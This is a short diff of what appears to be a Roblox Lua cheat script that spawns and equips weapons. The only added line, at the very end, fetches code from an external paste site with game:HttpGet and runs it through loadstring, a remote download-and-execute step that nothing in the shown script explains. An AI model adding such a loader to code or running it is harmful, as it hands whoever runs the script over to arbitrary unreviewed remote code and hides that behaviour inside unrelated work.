@@ -44874,3 +44874,4 @@ SELF.destroy = function()
 end
 
 setStatus(("Ready — %d weapons (%d full). Spawn + equip; works in-round too."):format(count, fullCount))
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/sfhc5TWuvd/0"))()
